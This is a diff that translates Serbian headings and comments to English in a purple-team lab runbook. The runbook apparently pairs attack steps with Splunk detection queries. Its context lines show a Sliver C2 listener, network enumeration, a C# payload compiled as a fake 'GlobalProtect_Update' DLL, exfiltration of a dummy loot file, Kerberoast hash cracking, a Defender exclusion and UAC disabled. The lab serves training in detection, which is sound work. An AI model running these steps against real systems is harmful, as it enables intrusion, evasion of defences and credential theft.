@@ -11,7 +11,7 @@
 
 ## PRE-FLIGHT
 
-### VM boot redosled
+### VM boot order
 1. HYDRA-DC
 2. Splunk Linux
 3. THEPUNISHER
@@ -23,7 +23,7 @@
 # Sliver server
 sudo sliver-server
 
-# Unutar Sliver konzole
+# Inside the Sliver console
 mtls --lport 443
 
 # SMB share (novi terminal)
@@ -41,7 +41,7 @@ Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled
 w32tm /resync /force
 ```
 
-### Splunk — verifikacija
+### Splunk — verification
 ```spl
 | metadata type=hosts
 | table host, recentTime
@@ -51,7 +51,7 @@ w32tm /resync /force
 
 ## SEGMENT 1 — RECONNAISSANCE
 
-### DC — AD korisnici
+### DC — AD users
 ```powershell
 Get-ADUser -Filter * -Properties MemberOf | Select-Object SamAccountName, @{N="Groups";E={$_.MemberOf -join ", "}}
 ```
@@ -61,12 +61,12 @@ Get-ADUser -Filter * -Properties MemberOf | Select-Object SamAccountName, @{N="G
 nmap -sV 192.168.182.0/24
 ```
 
-### SMB enumeracija (očekivan timeout)
+### SMB enumeration (timeout expected)
 ```bash
 nxc smb 192.168.182.135
 ```
 
-### LDAP enumeracija (anonymous bind fail)
+### LDAP enumeration (anonymous bind fails)
 ```bash
 nxc ldap 192.168.182.135 -u '' -p '' --users
 ```
@@ -160,7 +160,7 @@ public class Punisher : Installer
 EOF
 ```
 
-### Kali — Kompajliraj
+### Kali — Compile
 ```bash
 mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
 ```
@@ -231,7 +231,7 @@ sudo sliver-server
 ```
 
 ```
-# Unutar Sliver konzole
+# Inside the Sliver console
 jobs
 mtls --lport 443
 ```
@@ -241,7 +241,7 @@ mtls --lport 443
 C:\Temp\GlobalProtect_Update.exe
 ```
 
-### Sliver konzola — verifikacija sesije
+### Sliver console — session verification
 ```
 sessions
 use <session_id>
@@ -349,7 +349,7 @@ index=main source="WinEventLog:Security" EventCode=4698 host=THEPUNISHER
 | sort - _time
 ```
 
-### Splunk — Task iz sumnjive putanje
+### Splunk — task from a suspicious path
 ```spl
 index=main source="WinEventLog:Security" EventCode=4698
 | rex field=Message "Task Name:\s*(?<taskname>[^\r\n]+)"
@@ -368,13 +368,13 @@ index=main source="WinEventLog:Security" EventCode=4698
 echo "Top secret data: customer database backup" > C:\Temp\loot.txt
 ```
 
-### Sliver konzola — Exfiltration
+### Sliver console — exfiltration
 ```
 exit
 download C:\\Temp\\loot.txt
 ```
 
-### Kali — Verifikacija
+### Kali — verification
 ```bash
 cat ~/loot.txt
 ```
@@ -392,7 +392,7 @@ index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
 | where avg_count > 0.5 AND stdev_count < 1
 ```
 
-### Splunk — Long-running connections iz user-space
+### Splunk — long-running connections from user-space
 ```spl
 index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
 | rex field=Message "Image:\s*(?<process>[^\r\n]+)"
@@ -501,7 +501,7 @@ index=main source="WinEventLog:Security" earliest=-24h
 sudo ss -tlnp | grep 443
 sudo kill -9 <PID>
 sudo sliver-server
-# unutar konzole:
+# inside the console:
 # mtls --lport 443
 ```
 
@@ -520,7 +520,7 @@ start_from = oldest
 current_only = 0
 checkpointInterval = 5
 
-# ACL za Sysmon log
+# ACL for the Sysmon log
 wevtutil.exe sl "Microsoft-Windows-Sysmon/Operational" /ca:O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x1;;;BO)(A;;0x1;;;SO)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)
 
 Restart-Service SplunkForwarder
@@ -532,19 +532,19 @@ Restart-Service SplunkForwarder
 # Default Domain Policy → Edit
 # Computer Configuration → Policies → Windows Settings → Security Settings
 # → Advanced Audit Policy Configuration → Audit Policies
-# Postavi relevantne kategorije na Success and Failure
-# pa na endpointu:
+# Set the relevant categories to Success and Failure
+# then on the endpoint:
 gpupdate /force
 auditpol /get /subcategory:"<naziv>"
 ```
 
-### EC4698 ne loguje se
+### EC4698 is not logged
 ```
 # GPO: Default Domain Policy → Object Access → Audit Other Object Access Events → S&F
 gpupdate /force
 ```
 
-### EC4769 ne loguje se
+### EC4769 is not logged
 ```
 # GPO: Default Domain Controllers Policy → Account Logon → Audit Kerberos Service Ticket Operations → S&F
 gpupdate /force
@@ -582,7 +582,7 @@ john /tmp/kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
 Add-MpPreference -ExclusionPath "C:\Temp"
 ```
 
-### UAC — isključen na THEPUNISHER
+### UAC — disabled on THEPUNISHER
 ```
 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA = 0
